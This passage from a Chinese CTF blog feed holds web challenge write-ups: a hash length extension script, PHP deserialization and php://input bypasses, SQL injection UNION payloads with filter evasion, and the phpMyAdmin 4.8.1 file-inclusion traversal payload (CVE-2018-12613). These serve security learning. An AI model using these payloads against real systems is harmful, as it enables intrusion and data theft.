                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$role</span><span class="token operator">===</span><span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$hsh</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">"role"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//strrve函数反转字符串</span>
                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                                <span class="token variable">$auth</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$role</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token variable">$hsh</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'hsh'</span><span class="token punctuation">,</span><span class="token variable">$hsh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$auth</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span>Welcome Admin<span class="token punctuation">.</span> Your flag is
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">echo</span> <span class="token string">"&lt;h3>Only Admin can see the flag!!&lt;/h3>"</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
        <span class="token delimiter">?></span> <span class="token comment" spellcheck="true">//只截取了PHP部分</span>
</code></pre>
<p>分析代码，flag输出条件是 $role===”admin” &amp;&amp;hsh===md5($salt.strrev($_COOKIE[“role”]))</p>
<img src="/2019/11/30/md5扩展攻击/4.jpg" srcset="/img/loading.gif" title="image">

<p>这里得到<strong>$salt.strrev(s:5:”guest”;)</strong>的hsh，即$salt.’;&quot;tseug&quot;:5:s’的md5值： hsh=3a4727d57463f122833d9e732f94e4e0</p>
<p>以上是已知条件。</p>
<p>满足第一个条件只需要比较时$role开头是admin,接下来的字符是’\0’即可。</p>
<p>结合条件二，就可以这样构造</p>
<p>s:5:”admin”;+padding+s:5:”guest”;</p>
<p>而问题在于我们并不知道salt的长度</p>
<p>===&gt;可以写脚本爆破(借脚本参考)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true"># -*- coding=utf -*-</span>
<span class="token keyword">import</span> requests<span class="token punctuation">,</span>hashpumpy<span class="token punctuation">,</span>urllib


<span class="token keyword">def</span> <span class="token function">webre</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://web.jarvisoj.com:32778/'</span>
    sha <span class="token operator">=</span> <span class="token string">'3a4727d57463f122833d9e732f94e4e0'</span>
    string0 <span class="token operator">=</span> <span class="token string">';"tseug":5:s'</span>
    string1 <span class="token operator">=</span> <span class="token string">';"nimda":5:s'</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        digest<span class="token punctuation">,</span> message <span class="token operator">=</span> hashpumpy<span class="token punctuation">.</span>hashpump<span class="token punctuation">(</span>sha<span class="token punctuation">,</span>string0<span class="token punctuation">,</span>string1<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
        payload <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'role'</span><span class="token punctuation">:</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>message<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'hsh'</span><span class="token punctuation">:</span>digest<span class="token punctuation">}</span>  <span class="token operator">//</span> quote<span class="token punctuation">(</span><span class="token punctuation">)</span>用于把url编码，    <span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>用于反转字符
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>payload<span class="token punctuation">)</span> 
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content 
        <span class="token keyword">if</span> <span class="token string">'Welcome'</span> <span class="token keyword">in</span> html<span class="token punctuation">:</span> 
            <span class="token keyword">print</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>
webre<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>hashpump库使用说明</p>
<pre><code>hashpump(...)
    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)
    Arguments:
        hexdigest(str):      Hex-encoded result of hashing key + original_data.
        original_data(str):  Known data used to get the hash result hexdigest.
        data_to_add(str):    Data to append
        key_length(int):     Length of unknown data prepended to the hash
    Returns:
        A tuple containing the new hex digest and the new message.
&gt;&gt;&gt; hashpumpy.hashpump(&#39;ffffffff&#39;, &#39;original_data&#39;, &#39;data_to_add&#39;, len(&#39;KEYKEYKEY&#39;))
(&#39;e3c4a05f&#39;, &#39;original_datadata_to_add&#39;)</code></pre><p>===&gt; 也可以用bp爆破</p>
<img src="/2019/11/30/md5扩展攻击/7.png" srcset="/img/loading.gif" title="image">

<img src="/2019/11/30/md5扩展攻击/5.jpg" srcset="/img/loading.gif" title="image">

<p>参考：</p>
<p><a href="https://blog.csdn.net/qq1045553189/article/details/87566846" target="_blank" rel="noopener">https://blog.csdn.net/qq1045553189/article/details/87566846</a></p>
<p><a href="https://err0rzz.github.io/2017/09/18/hash长度扩展攻击/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/09/18/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</a></p>
]]></content>
      <categories>
        <category>攻击原理</category>
      </categories>
      <tags>
        <tag>HASH</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvis OJ WEB WP</title>
    <url>/2019/11/13/Jarvis%20OJ(web)WP/</url>
    <content><![CDATA[<h1 id="jarvis-OJ"><a href="#jarvis-OJ" class="headerlink" title="jarvis OJ"></a>jarvis OJ</h1><h2 id="神盾局"><a href="#神盾局" class="headerlink" title="神盾局"></a>神盾局</h2><p>打开网页是一张图片<br>查看源码发现</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image1.png" srcset="/img/loading.gif" title="image">

<a id="more"></a>

<p>base64转码发现后面是shield.jpg<br>尝试一下 index.php发现如下源码</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image2.png" srcset="/img/loading.gif" title="image">

<p>大概就是如果传入的class值不为空 就把这个值赋给g<br>再把g反序列化后赋给x<br>输出将x传入readfile后的值<br>再看一下 shield.php</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image3.png" srcset="/img/loading.gif" title="image">

<p>看见他告诉flag在 pctf.php 里<br> 如果传入的值不为空 且值中不存在.. 且不含/ 和\\<br>才能到file_get_contents函数读取文件</p>
<p>又读了一下showimg.php</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image4.png" srcset="/img/loading.gif" title="image">

<p>这就解释了为什么刚才直接读pctf.php显示FILE NOT FOUND<br>写个脚本</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image5.png" srcset="/img/loading.gif" title="image"> 

<p>O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;}<br>把这个值传入<br>注意！！是class不是之前的img 而且是从原页面上传入</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image6.png" srcset="/img/loading.gif" title="image">

<p>得到flag</p>
<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>看源码啥也没有<br>看一眼robots.txt</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image7.png" srcset="/img/loading.gif" title="image">

<p>进这个文件 发现是假flag<br>抓包<br>admin随便改个值得到flag</p>
<h2 id="in-a-mess"><a href="#in-a-mess" class="headerlink" title="in a mess"></a>in a mess</h2><p>查看源码</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image8.png" srcset="/img/loading.gif" title="image">

<p>分析<br>传入的a里如果不为0.则echo hahah并return<br>没有.就继续向下运行 给$data赋值从$a里读到的值如果data值等于 1112 is a nice lab!,id==0,b的长度大于5且b的第一个值是4 又要求b的第一个值不能等于4<br>才能运行flag.txt<br>每个条件都存在冲突<br>id php弱比较就能绕过 传入id=0e<br>a 看见file_get_contents函数想到文件包含 不知道有什么文件含这个字符串先放一下<br>b eregi可以%00截断 b=%0041111111<br>查了下大佬的wp<br>说a这里可以应用伪协议php://input<br>构造payload:<br><strong>?id=0e&amp;a=php://input&amp;b=%004111111</strong><br>同时<strong>post值1112 is a nice lab!</strong><br>得到这样的回显<br>Come ON!!! {/^HT2mCpcvOLf}</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image9.png" srcset="/img/loading.gif" title="image">

<p>盲猜他是个地址（长得也太难认了8</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image10.png" srcset="/img/loading.gif" title="image">

<p>进到这样一个界面 看见这样的形势 先测试一下sql注入</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image11.png" srcset="/img/loading.gif" title="image">

<p>确实是sql注入<br>可以看到它这里是过滤了空格 用/*22*/绕过 回显又正常了</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image12.png" srcset="/img/loading.gif" title="image">

<p>先测试字段数</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image13.png" srcset="/img/loading.gif" title="image">

<p>说明字段为3</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image">

<p>双写绕过对select和union的过滤<br>数据库名</p>
<pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p>
<p>表名</p>
<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">

<p>列名</p>
<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p>
<p>读文件</p>
<pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image">



<p><strong>持续更新</strong></p>
]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>jarvis OJ</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF WEB wp</title>
    <url>/2019/10/21/BUUCTFwp/</url>
    <content><![CDATA[<h1 id="BUUCTF-WEBwp"><a href="#BUUCTF-WEBwp" class="headerlink" title="BUUCTF WEBwp"></a><strong>BUUCTF WEBwp</strong></h1><h1 id="HCTF2018WarmUp"><a href="#HCTF2018WarmUp" class="headerlink" title="HCTF2018WarmUp"></a>HCTF2018WarmUp</h1><p>菜鸡发现了一个平台BUUCTF，web第一题就要去查wp，哎<br>查看源码给了source.php,如下</p>
<a id="more"></a>

<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">emmm</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
                <span class="token variable">$_page</span><span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span>
                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##不能为空</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##是字符串</span>
        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token shell-comment comment">##上面checkfile返回为true</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        exit<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>  
<span class="token delimiter">?></span></code></pre>
<p>hint.php</p>
<pre><code>flag not here, and flag in ffffllllaaaagggg</code></pre><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>构造payload:</p>
<pre><code>?file=hint.php%253f/../../../../ffffllllaaaagggg</code></pre><p>传入得到flag</p>
<p>具体为啥这么构造，参考下面的漏洞。</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>经过搜索这里是phpmyadmin4.8.1远程文件包含漏洞<br>所以先看懂这个漏洞-&gt;做题</p>
<h2 id="phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）"><a href="#phpmyadmin4-8-1远程文件包含漏洞（CVE-2018-12613）" class="headerlink" title="phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）"></a>phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。攻击者必须经过身份验证，但在这些情况下除外：</p>
<p>$_cfg [‘AllowArbitraryServer’] = true：攻击者可以指定他/她已经控制的任何主机，并在phpMyAdmin上执行任意代码</p>
<p>$_cfg [‘ServerDefault’] = 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>   在index.php里50-63行</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$target_blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span>
    <span class="token string">'import.php'</span><span class="token punctuation">,</span> <span class="token string">'export.php'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// If we have a valid target, let's load that script instead</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^index/'</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_blacklist</span><span class="token punctuation">)</span>
    <span class="token operator">&amp;&amp;</span> Core<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'target'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>满足五个条件：$_REQUEST[‘target’]不为空，是字符串，不以index开头，<strong><em>Core::checkPageValidity($REQUEST[‘target’])为真,则包含参数所指定的文件</em></strong></p>
<p>代码在libraries\classes\Core.php 443-476行</p>
<p>Core::checkPageValidity</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkPageValidity</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token keyword">array</span> <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$whitelist</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$goto_whitelist</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>
            <span class="token variable">$_page</span><span class="token punctuation">,</span>
            <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>mb_substr:截取字符串（与substr的区别是它可以截取中文）<br>mb_strpos:匹配（同理，可截取中文）<br>可以看到代码中用了两次有关截取?前字符,判断文件名是否在白名单里的操作<br>第一次很好理解，这里不再叙述<br>phpmyadmin团队考虑到target值后会再跟参数，为了能正确包含文件才使用了第二次截取<br>而就在这里出现了漏洞<br><strong>构造payload:</strong><br><code>target=db_sql.php%253f/../../test.txt</code><br>浏览器自行解码一次<br>变成:<br><code>target=db_sql.php%3f/../../test.txt</code><br>也就是说传入的数据里没？<br>所以这时的<strong>$page</strong>没被截取，<strong>$_page</strong>的值依然等于<strong>$page</strong><br>继续往下看，先经过函数urldecode一次<br>变成：<br><code>target=db_sql.php?/../../test.txt</code><br>这时候截取到问号前即$_page=db_dql.php, 符合条件通过下面的if判断,接着包含参数所指定的文件，即/../../test.txt(关于这个路径我也不知道是咋来的，我猜就是猜的，嗯)，达到读取test.txt的目的</p>
<p>参考：</p>
<p>[]: <a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">https://www.jianshu.com/p/0d75017c154f</a></p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p><strong>考点：反序列化逃逸</strong></p>
<p>先扫一波后台发现 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>核心功能在以下三个文件里</p>
<p><a href="https://imgchr.com/i/0AZYuT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AZYuT.png" srcset="/img/loading.gif" alt="0AZYuT.png"></a></p>
<p>同时扫出来的还有注册界面和config.php。鉴于zip文件里没给config.php，猜测flag与此文件有关。</p>
<p>先注个册进入上传页面抓个包。</p>
<p>下面是代码审计部分：</p>
<p>存：传参进profile[]里(update.php)–&gt;profile[]序列化–&gt;updatefile函数(class.php)<br><a href="https://imgchr.com/i/0AE9KO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AE9KO.png" srcset="/img/loading.gif" alt="0AE9KO.png"></a></p>
<p>–&gt;filter函数检测（where-&gt;hacker）–&gt;存数据库</p>
<p><img src="https://s1.ax1x.com/2020/09/27/0AEFVH.png" srcset="/img/loading.gif" alt="0AEFVH.png"></p>
<p><a href="https://imgchr.com/i/0AEAIA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEAIA.png" srcset="/img/loading.gif" alt="0AEAIA.png"></a></p>
<p>取：反序列化profile<a href="profile.php"></a>–&gt;file_get_contents取profile[$photo]读</p>
<p><a href="https://imgchr.com/i/0AEmxf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AEmxf.png" srcset="/img/loading.gif" alt="0AEmxf.png"></a></p>
<p>可利用之处就在filter函数中对username的检测:<br>若内容存在五位的where则会将它替换为六位的hacker。<br>又因为对photo的值有规定，我们只能考虑重新构造photo,<br>结合以上在这里利用反序列化逃逸。<br>初版构造的photo如下：</p>
<pre><code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code></pre><p><a href="https://imgchr.com/i/0AVpYn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/09/27/0AVpYn.md.png" srcset="/img/loading.gif" alt="0AVpYn.md.png"></a></p>
<p>失败原因是这里对nickname有长度限制，直接用数组绕过<br>其次这里还有个坑，如果你传入的是nickname[],他的反序列化不是这样</p>
